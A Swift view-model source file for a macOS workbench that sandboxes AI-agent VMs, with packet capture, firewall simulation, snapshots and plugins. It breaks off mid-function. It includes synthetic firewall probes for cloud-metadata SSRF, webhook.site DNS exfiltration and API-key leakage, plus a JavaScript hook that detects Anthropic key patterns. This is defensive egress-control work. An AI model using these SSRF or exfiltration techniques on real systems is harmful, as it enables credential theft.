import AgentVMCLIAndMCP
import AgentVMHypervisor
import AgentVMModels
import AgentVMNetSwitch
import AgentVMPluginHost
import AgentVMStorageCoW
import AgentVMStore
import AgentVMVsockRPC
import AgentVMWorkbenchShell
import AppKit
import Combine
import Foundation
import SwiftUI

// MARK: - Screenshot & Synchronous Hydration Scenarios

public enum StudioScreenshotScenario: String, CaseIterable, Sendable {
    case overviewLineageDAG = "screenshot-overview-dag.png"
    case packetWiretapInspector = "screenshot-packet-inspector.png"
    case storageAndCloudInit = "screenshot-storage-cloudinit.png"
    case splitPolicyAndPlugins = "screenshot-plugins-policy.png"

    public func localizedFilename(for language: AppLanguage) -> String {
        switch language {
        case .en:
            return rawValue
        case .zhHans:
            return rawValue.replacingOccurrences(of: ".png", with: "-zh.png")
        }
    }
}

public struct StudioHydratedSnapshot: Sendable {
    public var manifest: AgentVMProjectManifest
    public var hostCapabilities: HostCapabilityReport
    public var vms: [VMInstanceRecord]
    public var selectedVMID: VMID?
    public var snapshots: [SnapshotNode]
    public var selectedSnapshotID: SnapshotID?
    public var comparisonSnapshotID: SnapshotID?
    public var lcaDiffReport: SnapshotDiffReport?
    public var dagValidationReport: SnapshotDAGValidationReport?
    public var gcPlan: GarbageCollectionPlan?
    public var allPackets: [CapturedPacket]
    public var switchStatistics: SwitchStatisticsSnapshot
    public var activeFlows: [NetworkFlowRecord]
    public var dhcpLeases: [DHCPLeaseRecord]
    public var fdbEntries: [MACForwardingEntry]
    public var viewportSnapshot: VT100ViewportSnapshot
    public var serialPlainLines: [String]
    public var execResults: [GuestExecResult]
    public var portForwardBindings: [ActivePortForwardBinding]
    public var activeFirewallPolicy: FirewallPolicySet
    public var policyConflicts: [FirewallRuleConflictFinding]
    public var firewallMetrics: FirewallEngineMetrics
    public var simulationTrace: FirewallSimulationTrace
    public var diskAllocation: DiskAllocationSummary?
    public var diskForensics: DiskForensicsReport?
    public var apfsCapabilities: APFSVolumeCapabilities?
    public var isoInspection: ISOInspectionReport?
    public var isoRenderedFiles: [ISOFileEntry]
    public var editableCloudInit: CloudInitSpec
    public var pluginStatuses: [PluginRuntimeStatus]
    public var pluginLogs: [PluginHookConsoleEntry]
    public var scratchpadOutputJSON: String
    public var scratchpadConsoleLines: [String]
    public var scratchpadDurationMicros: UInt64
    public var hclPreview: String
    public var composePreview: String
    public var diagnostics: [DiagnosticEvent]
    public var undoSummaries: [UndoCommandSummary]
    public var redoSummaries: [UndoCommandSummary]
    public var persistedJournal: [UndoJournalRecord]
    public var lastForkLatencyMs: Double
}

// MARK: - Quick Wiretap Presets & Synthetic Packet Probes

public enum WiretapQuickPreset: String, CaseIterable, Identifiable, Sendable {
    case all = "All"
    case blocked = "Blocked"
    case tlsSNI = "TLS SNI"
    case dnsAndDHCP = "DNS / DHCP"

    public var id: String { rawValue }

    @MainActor
    public var localizedLabel: String {
        switch self {
        case .all: return L("All", "全部")
        case .blocked: return L("Blocked", "已拦截")
        case .tlsSNI: return L("TLS SNI", "TLS SNI")
        case .dnsAndDHCP: return L("DNS / DHCP", "DNS / DHCP")
        }
    }

    public var queryExpression: String {
        switch self {
        case .all:
            return ""
        case .blocked:
            return "verdict != ALLOW"
        case .tlsSNI:
            return "proto == TLS"
        case .dnsAndDHCP:
            return "proto == DNS || proto == DHCP"
        }
    }
}

public enum SyntheticPacketProbeKind: String, CaseIterable, Identifiable, Sendable {
    case githubTLS = "GitHub TLS 1.3 SNI (Allow)"
    case cloudMetadataSSRF = "AWS Metadata SSRF 169.254.169.254 (Drop)"
    case webhookDNSSinkhole = "Exfil DNS webhook.site (Sinkhole)"
    case secretBearerLeak = "HTTP Anthropic Key Leak (Plugin Drop)"

    public var id: String { rawValue }

    @MainActor
    public var localizedLabel: String {
        switch self {
        case .githubTLS:
            return L(rawValue, "GitHub TLS 1.3 SNI (放行)")
        case .cloudMetadataSSRF:
            return L(rawValue, "云元数据 SSRF 169.254.169.254 (丢弃)")
        case .webhookDNSSinkhole:
            return L(rawValue, "外泄域名 webhook.site (DNS 黑洞)")
        case .secretBearerLeak:
            return L(rawValue, "HTTP Anthropic 密钥外泄 (插件拦截)")
        }
    }
}

// MARK: - Primary @MainActor Industrial Workbench ViewModel

@MainActor
public final class AgentVMStudioViewModel: ObservableObject {
    // Core Subsystems
    public let coordinator: AgentVMFleetCoordinator
    public let docking: SplitDockingController
    public let commandPalette: CommandPaletteController
    public let toastCenter: WorkbenchToastCenter
    public let workspaceBundleURL: URL

    // Stateless Pure-Swift Engines for Immediate @MainActor Inspection
    private let diskEngine = APFSCoWDiskEngine()
    private let isoBuilder = ISO9660CloudInitBuilder()
    private let forensicsAnalyzer = DiskEntropyAndForensicsAnalyzer()
    private let lineageEngine = SnapshotLineageAndDiffEngine()
    private let iacCodec = TopologyIACCodec()
    private let htmlExporter = HtmlFleetReportExporter()

    private var cancellables = Set<AnyCancellable>()

    // Workspace & Host Telemetry
    @Published public var manifest: AgentVMProjectManifest = AgentVMProjectManifest()
    @Published public var preferences: WorkspacePreferences = WorkspacePreferences()
    @Published public var hostCapabilities: HostCapabilityReport = HostHypervisorProbe.probeCapabilities()
    @Published public var isBootstrapped: Bool = false
    @Published public var isBusy: Bool = false
    @Published public var lastStatusBanner: String = "Workspace ready"

    // Fleet & CoW Lineage DAG State
    @Published public var vms: [VMInstanceRecord] = []
    @Published public var selectedVMID: VMID?
    @Published public var snapshots: [SnapshotNode] = []
    @Published public var selectedSnapshotID: SnapshotID?
    @Published public var comparisonSnapshotID: SnapshotID?
    @Published public var currentLCADiff: SnapshotDiffReport?
    @Published public var dagValidationReport: SnapshotDAGValidationReport?
    @Published public var gcPlan: GarbageCollectionPlan?
    @Published public var lastForkLatencyMs: Double = 6.8

    // Wireshark L2 Packet Wiretap State
    @Published public var allPackets: [CapturedPacket] = []
    @Published public var filteredPackets: [CapturedPacket] = []
    @Published public var wiretapFilterText: String = ""
    @Published public var activeQuickPreset: WiretapQuickPreset = .all
    @Published public var parsedFilterQuery: WiretapFilterQuery = .matchAll
    @Published public var selectedPacketID: PacketID?
    @Published public var highlightedByteRange: Range<Int>?
    @Published public var selectedDissectedFieldID: String?
    @Published public var switchStatistics: SwitchStatisticsSnapshot?
    @Published public var activeFlows: [NetworkFlowRecord] = []
    @Published public var dhcpLeases: [DHCPLeaseRecord] = []
    @Published public var fdbEntries: [MACForwardingEntry] = []

    // Vsock / VT100 Serial Console State
    @Published public var viewportSnapshot: VT100ViewportSnapshot = VT100ViewportSnapshot(
        columns: 116,
        rows: 32,
        cursorRow: 0,
        cursorColumn: 0,
        isCursorVisible: true,
        isAlternateScreenActive: false,
        windowTitle: "agent@sandbox",
        scrollbackLineCount: 0,
        visibleGrid: Array(repeating: Array(repeating: .blank, count: 116), count: 32)
    )
    @Published public var serialPlainLines: [String] = []
    @Published public var consoleCommandInput: String = "git status --short && uname -srm"
    @Published public var consoleWorkingDirectory: String = "/workspace"
    @Published public var execResults: [GuestExecResult] = []
    @Published public var portForwardBindings: [ActivePortForwardBinding] = []

    // Firewall Policy Studio & Dry-Run Simulator State
    @Published public var activeFirewallPolicy: FirewallPolicySet = .strictAgentAllowlistPreset()
    @Published public var policyConflicts: [FirewallRuleConflictFinding] = []
    @Published public var firewallMetrics: FirewallEngineMetrics = FirewallEngineMetrics()
    @Published public var simProtocol: DissectedProtocolKind = .tls
    @Published public var simDestinationIP: String = "140.82.121.6"
    @Published public var simDestinationPort: String = "443"
    @Published public var simTLSSNI: String = "api.github.com"
    @Published public var simDNSQuery: String = ""
    @Published public var simHTTPHost: String = ""
    @Published public var simulationTrace: FirewallSimulationTrace?

    // APFS CoW Extents, Disk Forensics & Cloud-Init ISO-9660 State
    @Published public var diskAllocation: DiskAllocationSummary?
    @Published public var diskForensics: DiskForensicsReport?
    @Published public var apfsCapabilities: APFSVolumeCapabilities?
    @Published public var isoInspection: ISOInspectionReport?
    @Published public var isoRenderedFiles: [ISOFileEntry] = []
    @Published public var editableCloudInit: CloudInitSpec = CloudInitSpec()
    @Published public var selectedCloudInitFileTab: String = "user-data"

    // JavaScriptCore Plugin Host & Declarative IaC Bridge State
    @Published public var pluginStatuses: [PluginRuntimeStatus] = []
    @Published public var selectedPluginID: PluginID?
    @Published public var pluginLogs: [PluginHookConsoleEntry] = []
    @Published public var scratchpadSource: String = AgentVMStudioViewModel.defaultScratchpadScript
    @Published public var scratchpadOutputJSON: String = "{\n  \"action\" : \"drop\",\n  \"matchedRule\" : \"Anthropic API Token\",\n  \"severity\" : \"critical\"\n}"
    @Published public var scratchpadConsoleLines: [String] = []
    @Published public var scratchpadDurationMicros: UInt64 = 184
    @Published public var hclPreview: String = ""
    @Published public var composePreview: String = ""
    @Published public var selectedIaCFormat: String = "hcl"

    // Diagnostics & Undo/Redo Journal State
    @Published public var diagnostics: [DiagnosticEvent] = []
    @Published public var undoSummaries: [UndoCommandSummary] = []
    @Published public var redoSummaries: [UndoCommandSummary] = []
    @Published public var persistedJournal: [UndoJournalRecord] = []

    public static let defaultScratchpadScript: String = """
    // Sandboxed JSC L7 Hook (200ms Watchdog)
    function onPacket(pkt) {
      const body = (pkt.httpRequestLine || "")
        + " " + (pkt.asciiPreview || "");
      if (/sk-ant-[a-zA-Z0-9_-]{10,}/.test(body)) {
        AgentVM.log("warning", "Blocked token");
        return {
          action: "drop",
          reason: "Anthropic key leak blocked"
        };
      }
      if ((pkt.tlsSNI || "").includes("github")) {
        return {
          action: "allow",
          reason: "Verified GitHub TLS 1.3",
          sni: pkt.tlsSNI
        };
      }
      return { action: "allow", proto: pkt.protocol };
    }
    """

    // MARK: - Initialization

    public init(
        bundleURL: URL? = nil,
        coordinator: AgentVMFleetCoordinator? = nil,
        docking: SplitDockingController? = nil
    ) {
        let resolvedURL = bundleURL ?? Self.defaultInteractiveBundleURL()
        self.workspaceBundleURL = resolvedURL
        if let coordinator {
            self.coordinator = coordinator
        } else {
            do {
                self.coordinator = try AgentVMFleetCoordinator(
                    bundleURL: resolvedURL,
                    executionBackend: .automaticHybrid
                )
            } catch {
                let fallbackURL = URL(fileURLWithPath: NSTemporaryDirectory())
                    .appendingPathComponent("AgentVMFallback-\(UUID().uuidString).agentvm", isDirectory: true)
                // Guaranteed writable fallback directory
                self.coordinator = try! AgentVMFleetCoordinator(
                    bundleURL: fallbackURL,
                    executionBackend: .deterministicSimulation
                )
            }
        }

        let resolvedDocking = docking ?? SplitDockingController()
        resolvedDocking.leftRailWidth = 262
        resolvedDocking.rightRailWidth = 288
        resolvedDocking.bottomDrawerHeight = 176
        Self.applyCompactTabTitles(to: resolvedDocking)
        self.docking = resolvedDocking
        self.commandPalette = CommandPaletteController()
        self.toastCenter = WorkbenchToastCenter()

        forwardChildObjectChanges()
        registerExtendedCommandPaletteActions()
    }

    private static func applyCompactTabTitles(to docking: SplitDockingController) {
        for idx in docking.primaryTabs.indices {
            docking.primaryTabs[idx].title = docking.primaryTabs[idx].kind.localizedCompactTitle
        }
        for idx in docking.secondaryTabs.indices {
            docking.secondaryTabs[idx].title = docking.secondaryTabs[idx].kind.localizedCompactTitle
        }
    }

    public func refreshLocalizedChrome() {
        Self.applyCompactTabTitles(to: docking)
        registerExtendedCommandPaletteActions()
    }

    public var localizedWorkspaceTitle: String {
        switch manifest.title {
        case "AgentVM Sandbox Fleet", "Sandbox Fleet", "沙盒集群", "AgentVM 沙盒集群":
            return L("Sandbox Fleet", "沙盒集群")
        default:
            return manifest.title
        }
    }

    public static func defaultInteractiveBundleURL() -> URL {
        if let envPath = ProcessInfo.processInfo.environment["AGENTVM_WORKSPACE"], !envPath.isEmpty {
            return URL(fileURLWithPath: envPath, isDirectory: true)
        }
        let appSupport = FileManager.default.urls(for: .applicationSupportDirectory, in: .userDomainMask).first
            ?? URL(fileURLWithPath: NSTemporaryDirectory(), isDirectory: true)
        return appSupport
            .appendingPathComponent("AgentVM", isDirectory: true)
            .appendingPathComponent("DefaultFleet.agentvm", isDirectory: true)
    }

    private func forwardChildObjectChanges() {
        docking.objectWillChange
            .sink { [weak self] _ in self?.objectWillChange.send() }
            .store(in: &cancellables)
        commandPalette.objectWillChange
            .sink { [weak self] _ in self?.objectWillChange.send() }
            .store(in: &cancellables)
        toastCenter.objectWillChange
            .sink { [weak self] _ in self?.objectWillChange.send() }
            .store(in: &cancellables)
        AgentVMLocalizer.shared.objectWillChange
            .sink { [weak self] _ in
                guard let self else { return }
                self.objectWillChange.send()
                Task { @MainActor [weak self] in
                    self?.refreshLocalizedChrome()
                }
            }
            .store(in: &cancellables)
    }

    private func registerExtendedCommandPaletteActions() {
        var actions = CommandPaletteController.defaultBuiltInActions()
        actions.append(contentsOf: [
            CommandPaletteActionItem(
                id: "workspace.redo",
                title: L("Redo Last Reverted Workspace Mutation", "重做上一次已撤销的工作区变更"),
                subtitle: L("Re-applies the top command on the transactional redo stack", "重新应用事务重做栈顶部的可逆命令"),
                category: .workspaceView,
                keyEquivalentDisplay: "⇧⌘Z",
                sfSymbol: "arrow.uturn.forward",
                searchTokens: ["redo", "forward", "journal", "重做", "恢复"]
            ),
            CommandPaletteActionItem(
                id: "view.open.policy",
                title: L("Open Firewall Policy & Dry-Run Simulator", "打开防火墙策略与干跑模拟器"),
                subtitle: L("Priority L3/L4/L7 DPI allowlists, conflict linter, and packet trace simulator", "L3/L4/L7 优先级白名单、冲突检测与报文追踪模拟"),
                category: .networkFirewall,
                keyEquivalentDisplay: "⌘4",
                sfSymbol: "shield.lefthalf.filled",
                searchTokens: ["firewall", "policy", "simulate", "dpi", "sni", "防火墙", "策略", "模拟"]
            ),
            CommandPaletteActionItem(
                id: "view.open.storage",
                title: L("Open APFS CoW Extents & Cloud-Init ISO Studio", "打开 APFS CoW 区间与 Cloud-Init 镜像工坊"),
                subtitle: L("Inspect SEEK_HOLE/SEEK_DATA sparse extents, Shannon entropy, and cidata ISO-9660", "检视稀疏空洞区间、香农熵热力图与 cidata ISO-9660 镜像"),
                category: .cowBranching,
                keyEquivalentDisplay: "⌘5",
                sfSymbol: "externaldrive.connected.to.line.below",
                searchTokens: ["apfs", "storage", "extents", "iso", "cloud-init", "entropy", "存储", "镜像", "熵"]
            ),
            CommandPaletteActionItem(
                id: "view.open.plugins",
                title: L("Open JavaScriptCore Plugin Host & HCL Bridge", "打开 JavaScriptCore 插件沙盒与 HCL 桥接"),
                subtitle: L("Sandboxed JS hooks, live onPacket(pkt) scratchpad, and .avm.hcl export", "受限 JS 安全钩子、实时演练场与声明式 .avm.hcl 导出"),
                category: .pluginsAndAutomation,
                keyEquivalentDisplay: "⌘6",
                sfSymbol: "puzzlepiece.extension",
                searchTokens: ["plugin", "javascript", "hcl", "compose", "iac", "插件", "沙盒", "导出"]
            ),
            CommandPaletteActionItem(
                id: "plugins.export.hcl",
                title: L("Export Declarative .avm.hcl Topology", "导出声明式 .avm.hcl 拓扑清单"),
                subtitle: L("Writes multi-VM sandbox fleet and firewall rules to .avm.hcl", "将多虚拟机集群与防火墙规则导出为 .avm.hcl"),
                category: .pluginsAndAutomation,
                keyEquivalentDisplay: "⇧⌘E",
                sfSymbol: "doc.badge.gearshape",
                searchTokens: ["hcl", "terraform", "export", "topology", "导出", "拓扑"]
            )
        ])
        commandPalette.registerActions(actions)
        commandPalette.onExecuteAction = { [weak self] actionID in
            self?.executeCommandPaletteAction(actionID)
        }
    }

    // MARK: - Computed Telemetry Conveniences

    public var selectedVM: VMInstanceRecord? {
        if let selectedVMID, let match = vms.first(where: { $0.id == selectedVMID }) {
            return match
        }
        return vms.first
    }

    public var selectedSnapshot: SnapshotNode? {
        if let selectedSnapshotID, let match = snapshots.first(where: { $0.id == selectedSnapshotID }) {
            return match
        }
        return snapshots.first
    }

    public var selectedPacket: CapturedPacket? {
        if let selectedPacketID, let match = filteredPackets.first(where: { $0.id == selectedPacketID }) {
            return match
        }
        if let selectedPacketID, let match = allPackets.first(where: { $0.id == selectedPacketID }) {
            return match
        }
        return filteredPackets.first ?? allPackets.first
    }

    public var selectedPlugin: PluginRuntimeStatus? {
        if let selectedPluginID, let match = pluginStatuses.first(where: { $0.id == selectedPluginID }) {
            return match
        }
        return pluginStatuses.first
    }

    public var runningVMCount: Int {
        vms.filter { $0.telemetry.state == .running }.count
    }

    public var totalDirtyCoWBytes: UInt64 {
        let vmSum = vms.reduce(UInt64(0)) { $0 + $1.telemetry.cowDirtyBytes }
        if vmSum > 0 { return vmSum }
        return snapshots.reduce(UInt64(0)) { $0 + $1.dirtyDeltaBytes }
    }

    public var totalVirtualPoolBytes: UInt64 {
        vms.reduce(UInt64(0)) { sum, vm in
            sum + vm.spec.blockDevices.reduce(UInt64(0)) { $0 + $1.virtualSizeBytes }
        }
    }

    public var fleetCoWSpaceSavedPercent: Double {
        let virtualTotal = max(1, totalVirtualPoolBytes)
        let dirty = min(virtualTotal, totalDirtyCoWBytes)
        return max(0.0, min(99.9, (1.0 - Double(dirty) / Double(virtualTotal)) * 100.0))
    }

    public var droppedPacketCount: Int {
        allPackets.filter { !$0.verdict.isPermitted }.count
    }

    public var activePluginsCount: Int {
        pluginStatuses.filter(\.isEnabled).count
    }

    public var canUndo: Bool { !undoSummaries.isEmpty }
    public var canRedo: Bool { !redoSummaries.isEmpty }

    public var activePortForwardCountForSelectedVM: Int {
        guard let vm = selectedVM else { return portForwardBindings.count }
        let direct = portForwardBindings.filter { $0.vmID == vm.id }.count
        if direct > 0 { return direct }
        return vm.spec.portForwards.filter(\.enabled).count
    }

    // MARK: - Workspace Bootstrapping & Synchronous Hydration

    public func bootstrapWorkspace() async {
        guard !isBootstrapped else { return }
        isBusy = true
        defer { isBusy = false }

        do {
            let snapshot = try await buildHydratedSnapshot()
            hydrateSynchronously(from: snapshot)
            isBootstrapped = true
        } catch {
            toastCenter.post(
                title: "Workspace Bootstrap Error",
                detail: error.localizedDescription,
                severity: .error,
                autoDismissSeconds: 0
            )
        }
    }

    /// Seeds demonstration VMs, CoW branches, snapshots, L2 packets, ext4 superblocks, and JS plugin hooks if needed,
    /// then gathers every subsystem state into an immutable `StudioHydratedSnapshot` ready for synchronous `@MainActor` binding.
    public func buildHydratedSnapshot(preferredVMID: VMID? = nil) async throws -> StudioHydratedSnapshot {
        try await coordinator.store.seedDefaultFirewallPresetsIfNeeded()
        try await coordinator.seedIndustrialDemonstrationFleetIfEmpty()
        try await enrichDemonstrationArtifactsIfNeeded()

        let loadedManifest = try await coordinator.store.loadManifest()
        let caps = await coordinator.hostCapabilities()
        let loadedVMs = try await coordinator.store.listVMs()
        let loadedSnapshots = try await coordinator.store.listSnapshots()

        // Prefer claude-refactor-auth by default so APFS CoW shows Shared Parent + Dirty Delta + Sparse Holes!
        let chosenVM: VMInstanceRecord? = {
            if let preferredVMID, let found = loadedVMs.first(where: { $0.id == preferredVMID }) {
                return found
            }
            if let claude = loadedVMs.first(where: { $0.spec.name.contains("claude") }) {
                return claude
            }
            return loadedVMs.first
        }()

        // Select head snapshot of claude-refactor-auth and head snapshot of codex-fuzz-netstack for LCA diff
        let chosenSnapID: SnapshotID? = chosenVM?.currentHeadSnapshotID ?? loadedSnapshots.last?.id
        let compareSnapID: SnapshotID? = {
            if let codexVM = loadedVMs.first(where: { $0.spec.name.contains("codex") }),
               let headID = codexVM.currentHeadSnapshotID,
               headID != chosenSnapID {
                return headID
            }
            return loadedSnapshots.first(where: { $0.id != chosenSnapID })?.id
        }()

        let dagReport = try? lineageEngine.validateLineageDAG(snapshots: loadedSnapshots)
        let lcaDiff: SnapshotDiffReport? = {
            guard let left = chosenSnapID, let right = compareSnapID else { return nil }
            return try? lineageEngine.diffSnapshots(leftID: left, rightID: right, in: loadedSnapshots, computeChecksums: true)
        }()
        let gcPlan = try? lineageEngine.planGarbageCollection(
            snapshots: loadedSnapshots,
            policy: GarbageCollectionPolicy(keepMinimumPerBranch: 1, maxUnpinnedAgeHours: 0, preserveBranchForkPoints: true)
        )

        let packets = await coordinator.l2Switch.recentPackets(limit: 500)
        let switchStats = await coordinator.l2Switch.statistics()
        let flows = await coordinator.l2Switch.firewall.activeFlows()
        let leases = await coordinator.l2Switch.dhcpLeases()
        let fdb = await coordinator.l2Switch.forwardingTable()

        let activeVMID = chosenVM?.id ?? loadedVMs.first?.id
        let viewport: VT100ViewportSnapshot
        let plainLines: [String]
        if let activeVMID {
            let tty = await coordinator.terminalScreenBuffer(for: activeVMID)
            viewport = tty.snapshotViewport()
            plainLines = tty.renderPlainTextLines(includeScrollback: true).filter { !$0.isEmpty }
        } else {
            viewport = self.viewportSnapshot
            plainLines = []
        }

        let execs = try await coordinator.store.listExecResults(limit: 50)
        let bindings = await coordinator.portForwardManager.listActiveBindings()

        let fwPolicy = await coordinator.l2Switch.firewall.currentPolicy()
        let conflicts = await coordinator.l2Switch.firewall.analyzePolicyConflicts()
        let fwMetrics = await coordinator.l2Switch.firewall.metrics()
        let simPacket = makeSyntheticPacketForSimulation(
            vmID: activeVMID ?? VMID("vm-sim"),
            proto: simProtocol,
            dstIP: simDestinationIP,
            dstPort: UInt16(simDestinationPort) ?? 443,
            tlsSNI: simTLSSNI,
            dnsQuery: simDNSQuery,
            httpHost: simHTTPHost
        )
        let simTrace = await coordinator.l2Switch.firewall.simulate(simPacket)

        let storageInspection = inspectStorageAndCloudInit(for: chosenVM)

        let plugins = await coordinator.pluginEngine.listPluginStatuses()
        let pLogs = await coordinator.pluginEngine.recentConsoleLogs(limit: 120)

        let samplePkt = packets.first(where: { $0.tlsSNI == "api.github.com" })
            ?? packets.last
            ?? simPacket
        let scratchOutcome = (try? await coordinator.pluginEngine.evaluateScratchpadScript(
            source: scratchpadSource,
            samplePacket: samplePkt
        )) ?? (outputJSON: "{\n  \"action\" : \"allow\"\n}", consoleLines: [], durationMicros: 140)

        let allSpecs = loadedVMs.map(\.spec)
        let hcl = iacCodec.exportHCL(vms: allSpecs, policy: fwPolicy)
        let compose = iacCodec.exportDockerComposeYAML(vms: allSpecs)

        let diags = try await coordinator.store.listDiagnostics(limit: 120)
        let undoList = await coordinator.undoRedo.undoStackSummaries()
        let redoList = await coordinator.undoRedo.redoStackSummaries()
        let ledger = try await coordinator.undoRedo.persistedAuditLedger(from: coordinator.store, limit: 120)

        return StudioHydratedSnapshot(
            manifest: loadedManifest,
            hostCapabilities: caps,
            vms: loadedVMs,
            selectedVMID: chosenVM?.id,
            snapshots: loadedSnapshots,
            selectedSnapshotID: chosenSnapID,
            comparisonSnapshotID: compareSnapID,
            lcaDiffReport: lcaDiff,
            dagValidationReport: dagReport,
            gcPlan: gcPlan,
            allPackets: packets,
            switchStatistics: switchStats,
            activeFlows: flows,
            dhcpLeases: leases,
            fdbEntries: fdb,
            viewportSnapshot: viewport,
            serialPlainLines: plainLines,
            execResults: execs,
            portForwardBindings: bindings,
            activeFirewallPolicy: fwPolicy,
            policyConflicts: conflicts,
            firewallMetrics: fwMetrics,
            simulationTrace: simTrace,
            diskAllocation: storageInspection.allocation,
            diskForensics: storageInspection.forensics,
            apfsCapabilities: storageInspection.apfsCaps,
            isoInspection: storageInspection.isoReport,
            isoRenderedFiles: storageInspection.isoFiles,
            editableCloudInit: storageInspection.cloudInit,
            pluginStatuses: plugins,
            pluginLogs: pLogs,
            scratchpadOutputJSON: scratchOutcome.outputJSON,
            scratchpadConsoleLines: scratchOutcome.consoleLines,
            scratchpadDurationMicros: scratchOutcome.durationMicros,
            hclPreview: hcl,
            composePreview: compose,
            diagnostics: diags,
            undoSummaries: undoList,
            redoSummaries: redoList,
            persistedJournal: ledger,
            lastForkLatencyMs: 6.4
        )
    }

    public func hydrateSynchronously(from snapshot: StudioHydratedSnapshot) {
        self.manifest = snapshot.manifest
        self.preferences = snapshot.manifest.preferences
        self.hostCapabilities = snapshot.hostCapabilities
        self.vms = snapshot.vms
        self.selectedVMID = snapshot.selectedVMID
        self.snapshots = snapshot.snapshots
        self.selectedSnapshotID = snapshot.selectedSnapshotID
        self.comparisonSnapshotID = snapshot.comparisonSnapshotID
        self.currentLCADiff = snapshot.lcaDiffReport
        self.dagValidationReport = snapshot.dagValidationReport
        self.gcPlan = snapshot.gcPlan
        self.lastForkLatencyMs = snapshot.lastForkLatencyMs

        self.allPackets = snapshot.allPackets
        self.switchStatistics = snapshot.switchStatistics
        self.activeFlows = snapshot.activeFlows
        self.dhcpLeases = snapshot.dhcpLeases
        self.fdbEntries = snapshot.fdbEntries
        recomputeFilteredPackets()

        if selectedPacketID == nil {
            let preferredPacket = filteredPackets.first(where: { $0.tlsSNI == "api.github.com" })
                ?? filteredPackets.last
            selectPacket(preferredPacket?.id)
        }

        self.viewportSnapshot = snapshot.viewportSnapshot
        self.serialPlainLines = snapshot.serialPlainLines
        self.execResults = snapshot.execResults
        self.portForwardBindings = snapshot.portForwardBindings

        self.activeFirewallPolicy = snapshot.activeFirewallPolicy
        self.policyConflicts = snapshot.policyConflicts
        self.firewallMetrics = snapshot.firewallMetrics
        self.simulationTrace = snapshot.simulationTrace

        self.diskAllocation = snapshot.diskAllocation
        self.diskForensics = snapshot.diskForensics
        self.apfsCapabilities = snapshot.apfsCapabilities
        self.isoInspection = snapshot.isoInspection
        self.isoRenderedFiles = snapshot.isoRenderedFiles
        self.editableCloudInit = snapshot.editableCloudInit

        self.pluginStatuses = snapshot.pluginStatuses
        if selectedPluginID == nil {
            self.selectedPluginID = snapshot.pluginStatuses.first?.id
        }
        self.pluginLogs = snapshot.pluginLogs
        self.scratchpadOutputJSON = snapshot.scratchpadOutputJSON
        self.scratchpadConsoleLines = snapshot.scratchpadConsoleLines
        self.scratchpadDurationMicros = snapshot.scratchpadDurationMicros
        self.hclPreview = snapshot.hclPreview
        self.composePreview = snapshot.composePreview

        self.diagnostics = snapshot.diagnostics
        self.undoSummaries = snapshot.undoSummaries
        self.redoSummaries = snapshot.redoSummaries
        self.persistedJournal = snapshot.persistedJournal
        self.isBootstrapped = true
    }

    /// Configures deterministic layout, active tabs, and highlighted selections for each of the 4 Retina screenshots.
    public func configureScreenshotScenario(_ scenario: StudioScreenshotScenario) {
        toastCenter.activeToasts.forEach { toastCenter.dismiss(id: $0.id) }
        commandPalette.dismissInstant()

        switch scenario {
        case .overviewLineageDAG:
            docking.collapseSplit()
            docking.showLeftNavigator = true
            docking.showRightInspector = true
            docking.showBottomDrawer = true
            docking.activeBottomChannel = .firewallAlerts
            docking.openOrFocus(kind: .snapshotBranchDAG, inSecondaryPane: false)

        case .packetWiretapInspector:
            docking.collapseSplit()
            docking.showLeftNavigator = true
            docking.showRightInspector = false
            docking.showBottomDrawer = false
            applyWiretapFilter("")
            activeQuickPreset = .all
            docking.openOrFocus(kind: .packetWiretap, inSecondaryPane: false)
            if let ghPacket = allPackets.first(where: { $0.tlsSNI == "api.github.com" })
                ?? allPackets.first(where: { $0.highestProtocol == .tls }) {
                selectedPacketID = ghPacket.id
                // Highlight exact TLS SNI field bytes in the synchronized Hex + ASCII dump!
                if let sniRange = locateSNIByteRange(in: ghPacket) {
                    highlightedByteRange = sniRange
                } else if let tlsLayer = ghPacket.dissectedLayers.first(where: { $0.protocolKind == .tls }) {
                    highlightedByteRange = tlsLayer.byteRange
                }
            }

        case .storageAndCloudInit:
            docking.collapseSplit()
            docking.showLeftNavigator = true
            docking.showRightInspector = false
            docking.showBottomDrawer = false
            selectedCloudInitFileTab = "user-data"
            docking.openOrFocus(kind: .storageAndCloudInit, inSecondaryPane: false)

        case .splitPolicyAndPlugins:
            docking.showLeftNavigator = false
            docking.showRightInspector = false
            docking.showBottomDrawer = false
            docking.splitMode = .verticalTwoColumn
            docking.primaryTabs.removeAll { $0.kind == .pluginExtensionStudio }
            docking.openOrFocus(kind: .firewallPolicyStudio, inSecondaryPane: false)
            docking.openOrFocus(kind: .pluginExtensionStudio, inSecondaryPane: true)
            selectedIaCFormat = "hcl"
        }
        Self.applyCompactTabTitles(to: docking)
    }

    private func locateSNIByteRange(in packet: CapturedPacket) -> Range<Int>? {
        if let sni = packet.tlsSNI, let needle = sni.data(using: .utf8),
           let range = packet.rawFrame.range(of: needle) {
            return range.lowerBound..<range.upperBound
        }
        for layer in packet.dissectedLayers where layer.protocolKind == .tls {
            for field in layer.fields {
                for child in field.children {
                    if child.label.localizedCaseInsensitiveContains("SNI")
                        || child.valueSummary.localizedCaseInsensitiveContains("api.github.com") {
                        if !child.byteRange.isEmpty {
                            return child.byteRange
                        }
                    }
                }
                if field.label.localizedCaseInsensitiveContains("SNI")
                    || field.valueSummary.localizedCaseInsensitiveContains("api.github.com") {
                    if !field.byteRange.isEmpty && field.byteRange.count <= 64 {
                        return field.byteRange
                    }
                }
            }
        }
        return nil
    }

    private func enrichDemonstrationArtifactsIfNeeded() async throws {
        let vms = try await coordinator.store.listVMs()
        guard !vms.isEmpty else { return }

        // Stamp minimal ext4 magic (0xEF53 at partition + 1024 + 0x38) onto AGENTVM-ROOT partition if unformatted
        for vm in vms {
            guard let bootDisk = vm.spec.blockDevices.first else { continue }
            let diskURL = URL(fileURLWithPath: bootDisk.imagePath)
            guard FileManager.default.fileExists(atPath: diskURL.path),
                  let header = try? PartitionAndContainerInspector().inspectContainer(at: diskURL),
                  let rootPart = header.partitions.first(where: { $0.name.contains("ROOT") }) ?? header.partitions.last else {
                continue
            }
            let sbBase = rootPart.firstLBA * 512 + 1024
            if sbBase + 0x90 < bootDisk.virtualSizeBytes,
               let fh = try? FileHandle(forUpdating: diskURL) {
                try? fh.seek(toOffset: sbBase + 0x38)
                let existingMagic = (try? fh.read(upToCount: 2)) ?? Data()
                if existingMagic != Data([0x53, 0xEF]) {
                    // Blocks count LE + 4K log_block_size=2 + ext4 magic 0xEF53 + extents/64bit incompat flags + label
                    var sb = [UInt8](repeating: 0, count: 0x90)
                    let blocks: UInt32 = 6144
